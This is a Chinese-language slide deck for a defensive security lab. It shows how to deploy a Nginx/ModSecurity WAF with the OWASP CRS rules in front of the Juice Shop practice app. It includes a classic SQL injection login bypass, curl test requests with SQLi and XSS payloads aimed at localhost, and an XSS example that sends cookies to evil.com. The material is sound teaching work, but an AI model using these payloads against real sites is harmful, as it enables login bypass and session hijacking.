---
marp: true
theme: gaia
class: lead
paginate: true
backgroundColor: #0a0e27
color: #e0e0e0
style: |
  @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@300;400;500;700;900&display=swap');
  :root {
    --color-bg: #0a0e27;
    --color-primary: #00d4ff;
    --color-danger: #ff4757;
    --color-success: #2ed573;
    --color-warning: #ffa502;
    --color-text: #e0e0e0;
    --color-muted: #8a8fa8;
  }
  * {
    font-family: 'Noto Sans SC', sans-serif;
  }
  section::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 4px;
    background: linear-gradient(90deg, #00d4ff, #7c3aed, #ff4757);
  }
  h1 {
    color: #00d4ff;
    font-size: 2.4em;
    font-weight: 900;
    text-shadow: 0 0 40px rgba(0, 212, 255, 0.3);
  }
  h2 {
    color: #00d4ff;
    font-size: 1.6em;
    font-weight: 700;
    border-left: 4px solid #00d4ff;
    padding-left: 16px;
  }
  h3 {
    color: #7c3aed;
    font-size: 1.2em;
  }
  strong {
    color: #00d4ff;
  }
  .danger { color: #ff4757; font-weight: 700; }
  .success { color: #2ed573; font-weight: 700; }
  .warning { color: #ffa502; font-weight: 700; }
  .muted { color: #8a8fa8; }
  table {
    font-size: 0.75em;
    border-collapse: collapse;
    width: 100%;
  }
  th {
    background: rgba(0, 212, 255, 0.15);
    color: #00d4ff;
    padding: 8px 12px;
    border: 1px solid rgba(0, 212, 255, 0.3);
  }
  td {
    padding: 6px 12px;
    border: 1px solid rgba(255, 255, 255, 0.1);
  }
  code {
    background: rgba(124, 58, 237, 0.2);
    color: #c4b5fd;
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 0.85em;
  }
  blockquote {
    border-left: 3px solid #7c3aed;
    padding-left: 16px;
    color: #8a8fa8;
    font-style: italic;
    margin: 20px 0;
  }
---

<!-- _class: lead -->

# 🛡️ Lesson 02

## SQL 注入正在发生——部署第一道防线

---

## 回顾：当前安全链路

```
攻击者 → WAF (新课) → Juice Shop
          ↓
    NIDS (下节课) → HIDS → SIEM → Dashboard
```

上节课我们发现了问题：应用裸奔，没有任何防护。

---

## 场景：WAF 本可以阻止 Equifax

> **安全团队事后发现：如果及时部署了 WAF 并更新规则，攻击本可以被拦截。**

夜里收到消息：

- 攻击者正在进行 SQL 注入
- 试图绕过登录、窃取数据库、篡改数据
- 应用直接暴露，没有任何东西挡在攻击者和数据库之间

**立即决策：部署 WAF，现在就部署。**

---

## 新架构：WAF 上线

```
  ☠️ 攻击者
       │
       ▼ http://localhost:80
┌──────────────────┐
│ WAF (Nginx +     │  ← 新防线：检测并拦截恶意请求
│  ModSecurity)    │     OWASP CRS 规则集已启用
└────────┬─────────┘
         │ 内部网络
         ▼
┌──────────────────┐
│  Juice Shop      │  ← 被保护的应用
└──────────────────┘
```

---

## 关键概念：SQL 注入

> **SQL Injection** — 通过在用户输入中插入恶意 SQL 代码，使后端数据库执行非预期的命令。

**经典示例：**
```
登录输入: admin' OR 1=1 --
拼接后的 SQL:
  SELECT * FROM users WHERE username = 'admin' OR 1=1 --'
                                      ↑ 永远为真
结果：绕过认证，以 admin 身份登录
```

**本实验的测试：**
```bash
curl "http://localhost:80/rest/products/search?q=%27%20OR%201%3D1%20--"
```

---

## 攻击 vs 防御对比

| 攻击类型 | 无 WAF | 有 WAF |
|----------|--------|--------|
| SQL 注入 | <span class="danger">💀 直达后端</span> | <span class="success">🛡️ 403 拦截</span> |
| XSS | <span class="danger">💀 直达后端</span> | <span class="success">🛡️ 403 拦截</span> |
| 目录遍历 | <span class="danger">💀 直达后端</span> | <span class="success">🛡️ 403 拦截</span> |

```bash
# 正常请求 — 应通过
curl http://localhost:80

# SQL 注入 — 应被拦截 (403)
curl "http://localhost:80/rest/products/search?q=%27%20OR%201%3D1%20--"

# XSS — 应被拦截 (403)
curl "http://localhost:80/?q=%3Cscript%3Ealert(1)%3C/script%3E"
```

---

## 关键概念：WAF 是什么

**WAF (Web Application Firewall)** — 工作在 OSI 第 7 层，专门检测 HTTP/HTTPS 流量。

**工作原理：**
```
攻击者请求 → Nginx 接收 → ModSecurity 检测 → 匹配规则？
  ├── 是 → 返回 403，记录审计日志
  └── 否 → 转发到后端 Juice Shop
```

**两种模式：**
- **检测模式** — 只记录告警，不拦截（测试阶段）
- **拦截模式** — 匹配即返回 403（生产环境）

---

## 关键概念：OWASP CRS

**OWASP Core Rule Set** — ModSecurity 的"知识来源"，包含数千条预定义检测规则。

覆盖的攻击类型：
- SQL Injection
- Cross-Site Scripting (XSS)
- Local/Remote File Inclusion
- Remote Code Execution
- HTTP Protocol Violations

> WAF 不是魔法，它基于已知攻击模式匹配。规则库必须及时更新。

---

## 关键概念：XSS

> **跨站脚本 (XSS)** — 将恶意 JavaScript 注入到网页中，在其他用户浏览器中执行。

**示例：**
```html
评论输入: <script>document.location='http://evil.com/?c='+document.cookie</script>
效果：窃取用户 Session Cookie → 会话劫持
```

**三种类型：**
| 类型 | 存储位置 | 危险程度 |
|------|----------|---------|
| 反射型 | URL 参数 | 中 |
| 存储型 | 数据库 | 高 |
| DOM 型 | 前端代码 | 中-高 |

---

## CISO 观察记录

| 检查项 | 状态 | 备注 |
|--------|------|------|
| WAF 部署 | <span class="success">✅</span> | Nginx + ModSecurity |
| 正常流量 | <span class="success">✅</span> | 业务不受影响 |
| SQL 注入 | <span class="success">🛡️</span> | 403 拦截 |
| 端口扫描 | <span class="danger">❌</span> | WAF 只防护 HTTP |
| 主机监控 | <span class="danger">❌</span> | 文件篡改不知道 |

> **WAF 是重要的，但不能是唯一防线。纵深防御意味着多层检测。**

---

## 下一课

→ WAF 上线了，但攻击者很聪明——HTTP 层被挡住后，他们会进行**端口扫描、网络层探测**……

**这些 WAF 看不到。** 下一课将部署 **NIDS（网络入侵检测系统）Suricata**。
